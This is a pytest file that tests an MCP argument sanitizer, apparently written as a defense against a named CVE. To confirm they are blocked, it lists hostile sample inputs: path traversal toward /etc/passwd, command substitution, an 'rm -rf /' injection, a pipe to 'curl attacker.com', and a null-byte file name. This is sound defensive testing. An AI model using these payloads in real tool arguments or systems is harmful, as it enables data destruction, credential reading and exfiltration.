"""Test VAL-04.2: Parameter Sanitization Defense (CVE-2026-29791 & Spec 04)."""
import pytest
from src.mcp.sanitizer import parameter_sanitizer, ParameterSanitizerError


def test_clean_arguments_pass_unmodified():
    """Legitimate business arguments must pass cleanly."""
    args = {
        "query": "Q3 Sales Plan 2026",
        "recipients": ["priya@workkbot.in", "rahul@workkbot.com"],
        "metadata": {
            "folder": "Enterprise/Reports",
            "page_limit": 10,
        },
    }
    sanitized = parameter_sanitizer.sanitize_arguments(args)
    assert sanitized["query"] == "Q3 Sales Plan 2026"
    assert sanitized["recipients"] == ["priya@workkbot.in", "rahul@workkbot.com"]
    assert sanitized["metadata"]["folder"] == "Enterprise/Reports"


def test_path_traversal_attempts_blocked():
    """Path traversal sequences (../, ..\\, %2e%2e/) must be rejected."""
    attacks = [
        {"file_path": "../../../etc/passwd"},
        {"file_path": "..\\windows\\system32\\cmd.exe"},
        {"document_id": "doc123/%2e%2e/confidential"},
        {"nested": {"path": "../secret_keys.json"}},
    ]
    for attack_args in attacks:
        with pytest.raises(ParameterSanitizerError) as exc_info:
            parameter_sanitizer.sanitize_arguments(attack_args)
        assert "Path traversal detected" in str(exc_info.value)


def test_shell_metacharacters_blocked():
    """Shell execution tokens and command substitutions must be rejected."""
    attacks = [
        {"command": "$(cat /etc/passwd)"},
        {"arg": "`whoami`"},
        {"subject": "Hello; rm -rf /"},
        {"filter": "status=active | curl attacker.com"},
        {"redirect": "output > /tmp/evil"},
    ]
    for attack_args in attacks:
        with pytest.raises(ParameterSanitizerError) as exc_info:
            parameter_sanitizer.sanitize_arguments(attack_args)
        assert "Shell metacharacters detected" in str(exc_info.value)


def test_null_bytes_blocked():
    """Null byte injections must be blocked."""
    with pytest.raises(ParameterSanitizerError) as exc_info:
        parameter_sanitizer.sanitize_arguments({"file": "legit.pdf\x00.exe"})
    assert "Null byte detected" in str(exc_info.value)
